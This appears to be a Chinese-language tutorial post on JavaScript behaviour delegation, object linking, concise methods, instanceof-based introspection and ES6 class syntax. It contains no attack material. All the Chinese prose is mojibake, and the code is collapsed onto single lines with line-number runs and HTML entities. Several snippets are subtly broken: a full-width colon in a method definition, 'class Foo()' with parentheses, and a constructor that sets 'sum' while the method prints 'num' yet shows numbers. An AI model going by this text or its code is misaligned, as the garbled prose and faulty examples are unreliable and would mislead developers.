å€ŸåŠ©å¯¹è±¡å…³è”ï¼Œå¯ä»¥ç®€å•åœ°å‘ä¸Šå§”æ‰˜é“¾ä¸Šæ·»åŠ ä¸€ä¸ªæˆ–è€…å¤šä¸ªå¯¹è±¡ï¼Œè€Œä¸”åŒæ ·ä¸éœ€è¦å®žä¾‹åŒ–ï¼š 12var controller1 = Object.create(AuthController);var controller2 = Object.create(AuthController); åœ¨è¡Œä¸ºå§”æ‰˜æ¨¡å¼ä¸­ï¼ŒAuthController å’Œ LoginController åªæ˜¯å¯¹è±¡ï¼Œå®ƒä»¬ä¹‹é—´æ˜¯å…„å¼Ÿå…³ç³»ï¼Œå¹¶ä¸æ˜¯çˆ¶ç±»å’Œå­ç±»çš„å…³ç³»ï¼Œä»£ç ä¸­ AuthController å§”æ‰˜äº† LoginController ï¼Œåå‘å§”æ‰˜ä¹Ÿå¯ä»¥ã€‚ è¿™ç§æ¨¡å¼çš„é‡ç‚¹åœ¨äºŽåªéœ€è¦ä¸¤ä¸ªå®žä½“ï¼ˆLoginController å’Œ AuthController ï¼‰,è€Œä¹‹å‰çš„æ¨¡å¼éœ€è¦ä¸‰ä¸ªã€‚ æˆ‘ä»¬ä¸éœ€è¦ Controller åŸºæœ¬ç±»æ¥å…±äº«ä¸¤ä¸ªå®žä½“ä¹‹é—´çš„è¡Œä¸ºï¼Œå› ä¸ºå§”æ‰˜è¶³ä»¥æ»¡è¶³æˆ‘ä»¬éœ€è¦çš„åŠŸèƒ½ï¼ŒåŒæ ·çš„ï¼Œå‰é¢æåˆ°çš„ï¼Œæˆ‘ä»¬ä¹Ÿä¸éœ€è¦å®žä¾‹åŒ–ç±»ï¼Œå› ä¸ºå®ƒä»¬æ ¹æœ¬å°±ä¸æ˜¯ç±»ï¼Œå®ƒä»¬åªæ˜¯å¯¹è±¡ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ä¹Ÿä¸éœ€è¦åˆæˆï¼Œå› ä¸ºä¸¤ä¸ªå¯¹è±¡å¯ä»¥é€šè¿‡å§”æ‰˜è¿›è¡Œåˆä½œã€‚ æœ€åŽï¼Œæˆ‘ä»¬é¿å…äº†é¢å‘ç±»è®¾è®¡æ¨¡å¼çš„å¤šæ€ã€‚æˆ‘ä»¬åœ¨ä¸åŒçš„å¯¹è±¡ä¸­æ²¡æœ‰ä½¿ç”¨çš„å‡½æ•°å success å’Œ failure è¿™æ ·å°±ä¸éœ€è¦ä½¿ç”¨ä¸‘é™‹çš„æ˜¾å¼ä¼ªå¤šæ€ã€‚ç›¸åï¼Œåœ¨ AuthController ä¸­å®ƒä»¬çš„åå­—åˆ†åˆ«æ˜¯ accepted å’Œ rejected å¯ä»¥æ›´å¥½åœ°æè¿°å®ƒä»¬çš„è¡Œä¸ºã€‚ æ€»ç»“ï¼šæˆ‘ä»¬ä½¿ç”¨ä¸€ç§ç®€å•çš„è®¾è®¡æ¥å®žçŽ°äº†ç›¸åŒçš„åŠŸèƒ½ï¼Œè¿™å°±æ˜¯å¯¹è±¡å…³è”é£Žæ ¼ä»£ç å’Œè¡Œä¸ºå§”æ‰˜è®¾è®¡æ¨¡å¼çš„åŠ›é‡ã€‚ æ›´å¥½çš„è¯­æ³•ES6 çš„ class è¯­æ³•å¯ä»¥ç®€æ´åœ°å®šä¹‰ä¸º ç±»æ–¹æ³•,è¿™ä¸ªç‰¹æ€§è®© class ä¹çœ‹èµ·æ¥æ›´æœ‰å¸å¼•åŠ›ã€‚ 123class Foo()&#123; methodName()&#123;/*..*/&#125;&#125; åœ¨ ES6 ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä»»æ„å¯¹è±¡çš„å­—é¢å½¢å¼ä½¿ç”¨ç®€æ´æ–¹æ³•å£°æ˜Žï¼ˆconcise method declarationï¼‰ï¼Œæ‰€æ¬²å¯¹è±¡å…³è”é£Žæ ¼çš„å¯¹è±¡è¿˜å¯ä»¥è¿™æ ·å£°æ˜Žã€‚ 123456789var loginController = &#123; error:[], getUser()&#123; //,,, &#125;, getPassword()&#123; // ... &#125;&#125; å”¯ä¸€çš„åŒºåˆ«å°±æ˜¯å¯¹è±¡çš„å­—é¢å½¢å¼ä»ç„¶ä½¿ç”¨ â€œ,â€æ¥éš”å¼€å…ƒç´ ï¼Œè€Œ class ä¸éœ€è¦ã€‚ æ­¤å¤–ï¼Œåœ¨ ES6 ä¸­ï¼Œå¯ä»¥ä½¿ç”¨å¯¹è±¡çš„å­—é¢å½¢å¼æ¥æ”¹å†™ä¹‹å‰ç¹æ‚çš„å±žæ€§èµ‹å€¼è¯­æ³•ï¼Œç„¶åŽç”¨ Object.setPrototypeOf(..) æ¥ä¿®æ”¹å®ƒçš„ [[Prototype]] 12345678910111213// ä½¿ç”¨æ›´å¥½çš„å¯¹è±¡å­—é¢å½¢å¼è¯­æ³•å’Œç®€æ´æ–¹æ³•var AuthController = &#123; error:[], checkAuth()&#123; //.. &#125;, server(url,data)&#123; //.. &#125;, //..&#125;;// çŽ°åœ¨æŠŠ AuthController å…³è”åˆ° LoginControllerObject.setPrototypeOf(AuthController,LoginController); ä½¿ç”¨ ES6 çš„ç®€æ´æ–¹æ³•å¯ä»¥è®©å¯¹è±¡å…³è”é£Žæ ¼æ›´åŠ äººæ€§åŒ–ï¼ˆå¹¶ä¸”ä»ç„¶æ¯”å…¸åž‹çš„åŽŸåž‹é£Žæ ¼æ›´åŠ ç®€æ´å’Œä¼˜ç§€ï¼‰ã€‚ åè¯æ³•ç®€æ´æ–¹æ³•æœ‰ä¸€ä¸ªéžå¸¸å°ä½†æ˜¯éžå¸¸é‡è¦çš„ç¼ºç‚¹ï¼Œæ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 1234var Foo = &#123; bar()&#123;/*..*/&#125;, baz:function baz()&#123;/*..*/&#125;&#125; åŽ»æŽ‰è¯­æ³•ç³–ä¹‹åŽçš„ä»£ç å¦‚ä¸‹æ‰€ç¤º 1234var Foo = &#123; bar:function()&#123;/*..*/&#125;, baz:function baz()&#123;/*..*/&#125;&#125; ç”±äºŽå‡½æ•°å¯¹è±¡æœ¬èº«æ²¡æœ‰åç§°æ ‡è¯†ç¬¦ï¼Œæ‰€ä»¥ bar çš„ç¼©å†™å½¢å¼å®žé™…ä¸Šä¼šå˜æˆä¸€ä¸ªåŒ¿åå‡½æ•°è¡¨è¾¾å¼å¹¶ä¸”èµ‹å€¼ç»™ bar å±žæ€§ï¼Œç›¸æ¯”ä¹‹ä¸‹ï¼Œå…·åå‡½æ•°è¡¨è¾¾å¼ä¼šé¢å¤–åœ°ç»™ .baz å±žæ€§é™„åŠ ä¸€ä¸ªè¯æ³•åç§°æ ‡è¯†ç¬¦ bazã€‚ åœ¨å‰é¢æˆ‘ä»¬åˆ†æžäº†åŒ¿åå‡½æ•°è¡¨è¾¾å¼çš„ä¸‰å¤§ä¸»è¦ç¼ºç‚¹ï¼Œï¼ŒåŒ¿åå‡½æ•°æ²¡æœ‰ name æ ‡è¯†ç¬¦ï¼Œä¼šå¯¼è‡´ï¼š è°ƒç”¨æ ˆéš¾ä»¥è¿½è¸ª è‡ªæˆ‘å¼•ç”¨ï¼ˆé€’å½’ã€äº‹ä»¶ã€ï¼ˆæŽ¥è§¦ï¼‰ç»‘å®šç­‰ç­‰ï¼‰æ›´éš¾ ä»£ç æ›´éš¾ç†è§£ ç®€æ´æ–¹æ³•æ²¡æœ‰ç¬¬ä¸€å’Œç¬¬ä¸‰ä¸ªç¼ºç‚¹ã€‚ åŽ»æŽ‰è¯­æ³•ç³–çš„ç‰ˆæœ¬ä½¿ç”¨çš„æ˜¯åŒ¿åè¡¨è¾¾å¼ï¼Œé€šå¸¸æ¥è¯´ä¸ä¼šåœ¨è¿½è¸ªæ ˆä¸­æ·»åŠ  name ï¼Œä½†æ˜¯ç®€æ´æ–¹æ³•å¾ˆç‰¹æ®Šï¼Œä¼šç»™å¯¹åº”çš„å‡½æ•°å¯¹è±¡è®¾ç½®ä¸€ä¸ªå†…éƒ¨çš„ name å±žæ€§ï¼Œè¿™æ ·çš„ç†è®ºä¸Šå¯ä»¥ç”¨åœ¨è¿½è¸ªæ ˆä¸­ã€‚ï¼ˆä½†æ˜¯è¿½è¸ªçš„å…·ä½“å®žçŽ°æ˜¯ä¸åŒçš„ï¼Œå› ä¸ºæ— æ³•ä¿è¯å¯ä»¥ä½¿ç”¨ï¼‰ã€‚ ç®€æ´æ–¹æ³•æ— æ³•é¿å…ç¬¬äºŒä¸ªç¼ºç‚¹ï¼Œå®ƒä»¬ä¸å…·å¤‡è‡ªæˆ‘å¼•ç”¨çš„è¯æ³•æ ‡è¯†ç¬¦ï¼Œæ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 1234567891011121314var Foo = &#123; bar:function(x)&#123; if(x&lt;10)&#123; return Foo.bar(x*2); &#125; return x; &#125;, bazï¼šfunction()&#123; if(x&lt;10)&#123; return Foo.baz(x*2); &#125; return x; &#125;&#125; åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ä½¿ç”¨ Foo.bar(x*2)å°±è¶³å¤Ÿäº†ï¼Œä½†æ˜¯åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œæ— æ³•ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œæ¯”å¦‚å¤šä¸ªå¯¹è±¡é€šè¿‡ä»£ç†å…±äº«å‡½æ•°ï¼Œä½¿ç”¨ this ç»‘å®šï¼Œç­‰ç­‰ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œæœ€å¥½ä½¿ç”¨çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨å‡½æ•°å¯¹è±¡çš„ name æ ‡è¯†ç¬¦æ¥è¿›è¡ŒçœŸæ­£çš„è‡ªæˆ‘å¼•ç”¨ã€‚ ä½¿ç”¨ç®€æ´æ–¹æ³•ä¸€å®šè¦å°å¿ƒè¿™ä¸€ç‚¹ï¼Œå¦‚æžœéœ€è¦è‡ªæˆ‘å¼•ç”¨çš„æ—¶å€™ï¼Œé‚£æœ€å¥½çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨ä¼ ç»Ÿçš„å…·åå‡½æ•°è¡¨è¾¾å¼æ¥å®šä¹‰å¯¹åº”çš„å‡½æ•°ï¼Œä¸è¦ä½¿ç”¨ç®€æ´æ–¹æ³•ã€‚ å†…çœå†…çœå°±æ˜¯æ£€æŸ¥å®žä¾‹çš„ç±»åž‹ï¼Œç±»å®žä¾‹çš„å†…çœä¸»è¦ç›®çš„æ˜¯é€šè¿‡åˆ›å»ºæ–¹å¼æ¥åˆ¤æ–­å¯¹è±¡çš„ç»“æž„å’ŒåŠŸèƒ½ã€‚ ä¸‹é¢çš„ä»£ç å°±æ˜¯ä½¿ç”¨ instanceof æ¥æŽ¨æµ‹å¯¹è±¡çš„ a1 åŠŸèƒ½ï¼š 1234567891011function Foo()&#123; //..&#125;Foo.prototype.something = function()&#123; // ..&#125;var a1 = new Foo();//ä¹‹åŽif(a1 instanceof Foo)&#123; a1.something();&#125; å› ä¸º Foo.prototype(ä¸æ˜¯ Foo) åœ¨ a1 çš„ [[Prototype]] é“¾ä¸Šï¼Œæ‰€ä»¥ instanceof å¯ä»¥å‘Šè¯‰æˆ‘ä»¬ a1 æ˜¯ Foo ç±»çš„ä¸€ä¸ªå®žä¾‹ï¼ŒçŸ¥é“äº†è¿™ä¸€ç‚¹ä¹‹åŽï¼Œæˆ‘ä»¬å°±å¯ä»¥è®¤ä¸º a1 æœ‰ Foo â€œç±»â€æè¿°çš„åŠŸèƒ½ã€‚ å½“ç„¶ï¼ŒFoo ç±»å¹¶ä¸å­˜åœ¨ï¼Œåªæœ‰ä¸€ä¸ªæ™®é€šçš„å‡½æ•° Foo,å®ƒå¼•ç”¨äº† a1 å§”æ‰˜çš„å¯¹è±¡ï¼ˆFoo.prototypeï¼‰ã€‚ä»Žè¯­æ³•è§’åº¦æ¥è¯´ï¼Œinstanceof ä¼¼ä¹Žæ˜¯æ£€æŸ¥ a1 å’Œ Foo çš„å…³ç³»ï¼Œä½†æ˜¯å®žé™…ä¸Šå®ƒæƒ³è¯´çš„æ˜¯ a1 å’Œ Foo.prototype ï¼ˆå¼•ç”¨çš„å¯¹è±¡ï¼‰æ˜¯äº’ç›¸å…³è”çš„ã€‚ instanceof è¯­æ³•ä¼šäº§ç”Ÿè¯­ä¹‰å›°æƒ‘è€Œä¸”éžå¸¸ä¸ç›´è§‚ï¼Œå¦‚æžœæƒ³æ£€æŸ¥å¯¹è±¡a1 å’ŒæŸä¸ªå¯¹è±¡çš„å…³ç³»ï¼Œé‚£å¿…é¡»ä½¿ç”¨å¦ä¸€ä¸ªå¼•ç”¨è¯¥å¯¹è±¡çš„å‡½æ•°æ‰å¯ä»¥â€”â€”ä½ ä¸å¯ä»¥åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æ˜¯å¦å…³è”ã€‚ ä¹‹å‰ä»‹ç»çš„æŠ½è±¡çš„ Foo/Bar/b1 ä¾‹å­ï¼Œç®€å•æ¥è¯´æ˜¯è¿™æ ·çš„ï¼š 12345function Foo()&#123;&#125;Foo.prototype...function Bar()&#123;&#125;Bar.prototype = Object.create(Foo.prototype);var b1 = new Bar("b1"); å¦‚æžœè¦ä½¿ç”¨ instanceof å’Œ .prototype è¯­ä¹‰æ¥æ£€æŸ¥ä¸Šé¢ä¾‹å­ä¸­çš„å®žä½“çš„å…³ç³»ï¼Œé‚£å¿…é¡»è¿™æ ·åšï¼š 1234567891011// è®© Foo å’Œ Bar äº’ç›¸å…³è”Bar.prototype instanceof Foo; // trueObject.getPrototypeOf(Bar.prototype) === Foo.prototype; // trueFoo.prototype.isPrototypeOf(Bar.prototype); // true// è®© b1 å…³è”åˆ° Foo å’Œ Barb1 instanceof Foo; // trueb1 instanceof Bar; // trueObject.getPrototypeOf(b1) === Bar.prototype; // trueBar.prototype.isPrototypeOf(b1); // trueFoo.prototype.isPrototypeOf(b1); // true æ˜¾ç„¶è¿™æ˜¯ä¸€ç§éžå¸¸ç³Ÿç³•çš„æ–¹æ³•ï¼Œä¸¾ä¾‹æ¥è¯´ï¼ˆä½¿ç”¨ç±»æ—¶ï¼‰ä½ æœ€ç›´è§‚çš„æƒ³æ³•å¯èƒ½æ˜¯ä½¿ç”¨ Bar instanceof Foo(å› ä¸ºå¾ˆå®¹æ˜“æŠŠå®žä¾‹ç†è§£æˆç»§æ‰¿)ï¼Œä½†æ˜¯åœ¨ JavaScript ä¸­æ˜¯è¡Œä¸é€šçš„ï¼Œä½ å¿…é¡»ä½¿ç”¨ Bar.prototype instanceof Foo. è¿˜æœ‰ä¸€ç§å¸¸è§çš„ä½†æ˜¯å¾ˆè„†å¼±çš„å†…çœæ¨¡å¼ï¼Œè¿™ç§æ¨¡å¼è¢«ç§°ä¸ºé¸­å­ç±»åž‹ã€‚ 123if(a1.something)&#123; a1.something();&#125; æˆ‘ä»¬å¹¶æ²¡æœ‰æ£€æŸ¥ a1 å’Œ å§”æ‰˜ something()å‡½æ•°çš„å¯¹è±¡ä¹‹é—´çš„å…³ç³»ï¼Œè€Œæ˜¯å‡è®¾å¦‚æžœå¦‚æžœ a1 é€šè¿‡äº† æµ‹è¯• a1.something çš„è¯ï¼Œé‚£ä¹ˆ a1 å°±ä¸€å®šå¯ä»¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼ˆæ— è®ºè¿™ä¸ªæ–¹æ³•æ˜¯å¦å­˜åœ¨äºŽå®ƒæœ¬èº«æˆ–æ˜¯å§”æ‰˜åˆ°å…¶ä»–å¯¹è±¡ï¼‰ã€‚ ä½†æ˜¯ â€œé¸­å­ç±»åž‹â€é€šå¸¸ä¼šåœ¨æµ‹è¯•ä¹‹å¤–åšå‡ºå¾ˆå¤šå…³äºŽå¯¹è±¡åŠŸèƒ½çš„å‡è®¾ï¼Œè¿™ä¼šå¸¦æ¥å¾ˆå¤šé£Žé™©ï¼ˆæˆ–è€…è¯´è„†å¼±çš„è®¾è®¡ï¼‰ã€‚ ES6 çš„ Promise å°±æ˜¯å…¸åž‹çš„ â€œé¸­å­æ¨¡å¼â€ã€‚ ç”±äºŽå„ç§å„æ ·çš„åŽŸå› ï¼Œæˆ‘ä»¬éœ€è¦åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡å¼•ç”¨æ˜¯å¦æ˜¯ Promise ï¼Œä½†æ˜¯åˆ¤æ–­çš„æ–¹æ³•å°±æ˜¯æ£€æŸ¥å¯¹è±¡ä¸­æ˜¯å¦æœ‰ then æ–¹æ³•ï¼Œæ¢å¥è¯è¯´ï¼Œå¦‚æžœå¯¹è±¡ä¸­æœ‰ then æ–¹æ³•ï¼ŒES6 çš„Promise å°±ä¼šè®¤ä¸ºè¿™ä¸ªå¯¹è±¡æ˜¯â€œå¯æŒç»­çš„â€ï¼ˆthenableï¼‰ï¼Œå› æ­¤ä¼šæœŸæœ›å®ƒå…·æœ‰ Promise çš„æ‰€æœ‰æ ‡å‡†è¡Œä¸ºã€‚ å¦‚æžœæœ‰ä¸€ä¸ªä¸æ˜¯ Promise ä½†æ˜¯å…·æœ‰ then æ–¹æ³•çš„å¯¹è±¡ï¼Œé‚£å°±åƒä¸‡ä¸è¦æŠŠå®ƒç”¨åœ¨ ES6 ä¸­çš„ Promise æœºåˆ¶ä¸­ï¼Œå¦åˆ™ä¼šå‡ºé”™ã€‚ ä½¿ç”¨å¯¹è±¡å…³è”æ—¶ï¼Œæ‰€æœ‰çš„å¯¹è±¡éƒ½æ˜¯é€šè¿‡ [[Prototype]] å§”æ‰˜ç›¸äº’å…³è”çš„ï¼Œä¸‹é¢æ˜¯å†…çœçš„æ–¹æ³• 1234567// è®© Foo å’Œ Bar äº’ç›¸å…³è”Foo.isPrototypeOf(Bar); // trueObject.getPrototypeOf(Bar) === Foo; // true// è®© b1 å…³è”åˆ° Foo å’Œ BarFoo.isPrototypeOf(b1); // trueBar.isPrototypeOf(b1); // trueObject.getPrototypeOf(b1) === Bar; // true æˆ‘ä»¬æ²¡æœ‰ä½¿ç”¨ instanceof å› ä¸ºå®ƒä¼šäº§ç”Ÿä¸€äº›å’Œç±»æœ‰å…³çš„è¯¯è§£ã€‚æˆ‘ä»¬è®¤ä¸º JavaScript ä¸­å¯¹è±¡å…³è”æ¯”ç±»é£Žæ ¼çš„ä»£ç æ›´åŠ ç®€æ´ï¼ˆè€Œä¸”åŠŸèƒ½ç›¸åŒï¼‰ å°ç»“åœ¨è½¯ä»¶æž¶æž„ä¸­ä½ å¯ä»¥é€‰æ‹©æ˜¯å¦ä½¿ç”¨ç±»å’Œç»§æ‰¿è®¾è®¡æ¨¡å¼ï¼Œå¤§å¤šæ•°å¼€å‘è€…ç†æ‰€å½“ç„¶åœ°è®¤ä¸ºç±»æ˜¯å”¯ä¸€çš„ä»£ç ç»„ç»‡æ–¹å¼ï¼Œä½†æ˜¯æœ¬ç« ä¸­æˆ‘ä»¬çœ‹åˆ°å¦ä¸€ç§å°‘è§ä½†æ˜¯æ›´å¼ºå¤§çš„è®¾è®¡è¡Œä¸ºï¼šè¡Œä¸ºå§”æ‰˜ã€‚ è¡Œä¸ºå§”æ‰˜è®¤ä¸ºå¯¹è±¡ä¹‹é—´æ˜¯å…„å¼Ÿå…³ç³»ï¼Œäº’ç›¸å§”æ‰˜ï¼Œä¸æ˜¯çˆ¶ç±»å’Œå­ç±»çš„å…³ç³»ã€‚JavaScript çš„ [[Prototype]] æœºåˆ¶æœ¬è´¨ä¸Šå°±æ˜¯è¡Œä¸ºå§”æ‰˜æœºåˆ¶ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©åœ¨ JavaScript ä¸­åŠªåŠ›å®žçŽ°ç±»æœºåˆ¶ï¼Œä¹Ÿå¯ä»¥æ‹¥æŠ±æ›´è‡ªç„¶çš„ [[Prototype]] å§”æ‰˜æœºåˆ¶ã€‚ å½“ä½ åªç”¨å¯¹è±¡è®¾è®¡ä»£ç æ—¶ï¼Œä¸ä»…å¯ä»¥è®©è¯­æ³•æ›´åŠ ç®€æ´ï¼Œè€Œä¸”å¯ä»¥è®©ä»£ç ç»“æž„æ›´åŠ æ¸…æ™°ã€‚ å¯¹è±¡å…³è”ï¼ˆå¯¹è±¡ä¹‹å‰äº’ç›¸å…³è”ï¼‰æ˜¯ä¸€ç§ç¼–ç é£Žæ ¼ï¼Œå®ƒå€¡å¯¼çš„æ˜¯ç›´æŽ¥åˆ›å»ºå’Œå…³è”å¯¹è±¡ï¼Œä¸æŠŠå®ƒä»¬æŠ½è±¡æˆç±»ã€‚å¯¹è±¡å…³è”å¯ä»¥ç”¨åŸºäºŽ [[Prototype]] çš„è¡Œä¸ºå§”æ‰˜éžå¸¸è‡ªç„¶åœ°å®žçŽ°ã€‚ é™„å½•ES6 ä¸­çš„ Classç±»æ˜¯ä¸€ç§å¯é€‰çš„ï¼ˆè€Œä¸æ˜¯å¿…é¡»ï¼‰çš„è®¾è®¡æ¨¡å¼ï¼Œè€Œä¸”åœ¨ JavaScript è¿™æ ·çš„ [[Prototype]] è¯­è¨€ä¸­å®žçŽ°ç±»æ˜¯å¾ˆåˆ«æ‰­çš„ã€‚ ç¼ºç‚¹ï¼šç¹çæ‚ä¹±çš„ .prototype å¼•ç”¨ã€è¯•å›¾è°ƒç”¨åŽŸåž‹é“¾ä¸Šå±‚åŒåå‡½æ•°æ—¶çš„æ˜¾å¼ä¼ªå¤šæ€ä»¥åŠä¸å¯é ã€ä¸ç¾Žè§‚å®¹æ˜“è¢«è¯¯è§£æˆâ€œæž„é€ å‡½æ•°â€œçš„ .construtorã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œç±»è®¾è®¡å…¶å®žè¿˜æœ‰æ›´æ·±åˆ»çš„é—®é¢˜ï¼Œä¼ ç»Ÿé¢å‘ç±»çš„è¯­è¨€ä¸­çˆ¶å­ç±»ï¼Œå­å’Œå®žä¾‹ä¹‹é—´å…¶å®žæ˜¯å¤åˆ¶æ“ä½œï¼Œä½†æ˜¯åœ¨ [[Prototype]] ä¸­å¹¶æ²¡æœ‰å¤åˆ¶ï¼Œç›¸åï¼Œå®ƒä»¬ä¹‹é—´åªæœ‰å§”æ‰˜å…³è”ã€‚ å¯¹è±¡å…³è”ä»£ç å’Œè¡Œä¸ºå§”æ‰˜ä½¿ç”¨äº† [[Prototype]] è€Œä¸æ˜¯å°†å®ƒä»¬è—èµ·æ¥ï¼Œå¯¹æ¯”èµ·ç®€æ´æ€§å¯ä»¥çœ‹å‡ºï¼Œç±»å¹¶ä¸é€‚ç”¨ JavaScirpt. classES6 çš„ class æœºåˆ¶ï¼Œä¼šä»‹ç»å®ƒçš„å·¥ä½œåŽŸç†ä»¥åŠæ˜¯å¦æ”¹è¿›äº†ä¹‹å‰æåˆ°çš„ç¼ºç‚¹ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839// çˆ¶ç±»class Widget&#123; constructor(width,height)&#123; this.width = width || 50; this.height = height || 50; this.$elem = null; &#125; render($where)&#123; if(this.$elem)&#123; this.$elem.css(&#123; width:this.width + 'px', height:this.height + 'px', &#125;).appendTo($where); &#125; &#125;&#125;class Button extends Widget&#123; constructor(width,height,label)&#123; super(width,height); this.label = label || "Default"; this.$elem = $("&lt;button&gt;").text(this.label); &#125; render($where)&#123; super.render($where) this.$elem.click(this.onClick.bind(this)); &#125; onClick(evt)&#123; console.log("Button "+ this.label +" clicked!"); &#125;&#125;$(document).ready(function()&#123; var $body = $(document.body); var btn1 = new Button(125,30,"Hello"); var btn2 = new Button(150,40,"World"); btn1.render($body); btn2.render($body);&#125;); é™¤äº†è¯­æ³•æ›´åŠ å¥½çœ‹ä¹‹å¤–ï¼ŒES6 è¿˜è§£å†³äº†ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ ä¸å†å¼•ç”¨æ‚ä¹±çš„ .prototype äº† Button å£°æ˜Žæ—¶ç›´æŽ¥â€œç»§æ‰¿â€ äº† Widgetï¼Œä¸å†éœ€è¦é€šè¿‡ Object.create(..) æ¥æ›¿æ¢ .prototype å¯¹è±¡ï¼Œä¹Ÿä¸éœ€è¦è®¾ç½® .__proto__ æˆ–è€… Object.setPrototypeOf(..) å¯ä»¥é€šè¿‡ super(..) æ¥å®žçŽ°ç›¸å¯¹å¤šæ€ï¼Œè¿™æ ·ä»»ä½•é˜²èŒƒéƒ½å¯ä»¥å¼•ç”¨åŽŸåž‹é“¾ä¸Šå±‚çš„åŒåæ–¹æ³•ï¼Œå¯ä»¥è§£å†³ä¹‹å‰æåˆ°çš„é—®é¢˜ï¼šæž„é€ å‡½æ•°ä¸å±žäºŽç±»ï¼Œæ‰€ä»¥æ— æ³•äº’ç›¸å¼•ç”¨â€”â€”super() å¯ä»¥å®Œç¾Žè§£å†³æž„é€ å‡½æ•°çš„é—®é¢˜ã€‚ class å­—é¢è¯­æ³•ä¸èƒ½å£°æ˜Žå±žæ€§ï¼ˆåªèƒ½å£°æ˜Žæ–¹æ³•ï¼‰ã€‚çœ‹èµ·æ¥è¿™æ˜¯ä¸€ç§é™åˆ¶ï¼Œä½†æ˜¯å®ƒä¼šæŽ’é™¤æŽ‰å¾ˆå¤šä¸å¥½çš„æƒ…å†µï¼Œå¦‚æžœæ²¡æœ‰è¿™ç§é™åˆ¶çš„è¯ï¼ŒåŽŸåž‹é“¾æœ«ç«¯çš„å®žä¾‹å¯èƒ½ä¼šæ„å¤–åœ°èŽ·å–å…¶ä»–åœ°æ–¹çš„å±žæ€§ï¼ˆè¿™äº›å±žæ€§éšå¼è¢«æ‰€æœ‰â€œå®žä¾‹â€æ‰€å…±äº«ï¼‰ã€‚æ‰€ä»¥ ï¼Œclassè¯­æ³•å®žé™…ä¸Šå¯ä»¥å¸®ä½ é¿å…çŠ¯é”™ã€‚ å¯ä»¥é€šè¿‡ extends å¾ˆè‡ªç„¶æ‰©å±•å¯¹è±¡ï¼ˆå­ï¼‰ç±»åž‹ï¼Œç”šè‡³æ˜¯å†…ç½®çš„å¯¹è±¡ï¼ˆå­ï¼‰ç±»åž‹ï¼Œæ¯”å¦‚ Arrayï¼ŒRegExpã€‚æ²¡æœ‰ class ..extends è¯­æ³•æ—¶ï¼Œæƒ³å®žçŽ°è¿™ä¸€ç‚¹æ˜¯éžå¸¸å›°éš¾çš„ï¼ŒåŸºæœ¬ä¸Šåªæœ‰æ¡†æž¶çš„ä½œè€…æ‰èƒ½æžæ‡‚è¿™ä¸€ç‚¹ã€‚ä½†æ˜¯çŽ°åœ¨å¯ä»¥è½»è€Œæ˜“ä¸¾åœ°åšåˆ°ã€‚ å¹³å¿ƒè€Œè®º,class è¯­æ³•ç¡®å®žè§£å†³äº†å…¸åž‹åŽŸåž‹é£Žæ ¼ä»£ç ä¸­å¾ˆå¤šæ˜¾è€Œæ˜“è§çš„ï¼ˆè¯­æ³•ï¼‰é—®é¢˜å’Œç¼ºç‚¹ã€‚ class é™·é˜±ç„¶åŽï¼Œclass è¯­æ³•å¹¶æ²¡æœ‰è§£å†³æ‰€æœ‰çš„é—®é¢˜ï¼Œåœ¨ JavaScript ä¸­ä½¿ç”¨ â€œç±»â€è®¾è®¡æ¨¡å¼ä»ç„¶å­˜åœ¨è®¸å¤šæ·±å±‚é—®é¢˜ã€‚ é¦–å…ˆï¼Œä½ å¯èƒ½ä¼šè®¤ä¸º ES6 çš„ class è¯­æ³•æ˜¯å‘ JavaScript ä¸­å¼•å…¥äº†ä¸€ç§æ–°çš„ â€œç±»â€æœºåˆ¶ï¼Œå…¶å®žä¸æ˜¯è¿™æ ·çš„ï¼Œclass åŸºæœ¬ä¸Šåªæ˜¯çŽ°æœ‰çš„ [[Prototype]] ï¼ˆå§”æ‰˜ï¼ï¼‰æœºåˆ¶çš„ä¸€ç§è¯­æ³•ç³–ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œclass å¹¶ä¸ä¼šåƒä¼ ç»Ÿé¢å‘ç±»çš„è¯­è¨€ä¸€æ ·åœ¨å£°æ˜Žæ—¶é™æ€å¤åˆ¶æ‰€æœ‰çš„è¡Œä¸ºã€‚å¦‚æžœä¿®æ”¹æˆ–è€…æ›¿æ¢äº†çˆ¶â€œç±»â€ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œé‚£ä¹ˆå­â€œç±»â€å’Œæ‰€æœ‰å®žä¾‹éƒ½ä¼šå—åˆ°å½±å“ï¼Œå› ä¸ºå®ƒä»¬åœ¨å®šä¹‰æ—¶å¹¶æ²¡æœ‰è¿›è¡Œå¤åˆ¶ï¼Œåªæ˜¯é€‚ç”¨åŸºäºŽ [[Prototype]] çš„å®žæ—¶å§”æ‰˜ï¼š 12345678910111213141516class C&#123; constructor()&#123; this.sum = Math.random(); &#125; rand()&#123; console.log("Random: "+this.num); &#125;&#125;var c1 = new C();c1.rand(); // "Random: 0.4546976..."C.prototype.rand = function()&#123; console.log("Random: "+Math.round(this.num * 1000));&#125;var c2 = new C();c2.rand(); // "Random: 867"c1.rand(); // "Random: 425" ä¸ºä»€ä¹ˆè¦ä½¿ç”¨æœ¬è´¨ä¸Šä¸æ˜¯ç±»çš„ class è¯­æ³•ï¼Ÿ ES6 çš„ class è¯­æ³•ä¸æ˜¯è®©ä¼ ç»Ÿç±»å’Œå§”æ‰˜å¯¹è±¡ä¹‹é—´çš„åŒºåˆ«æ›´åŠ éš¾ä»¥å‘çŽ°å’Œç†è§£å—ï¼Ÿ class è¯­æ³•æ— 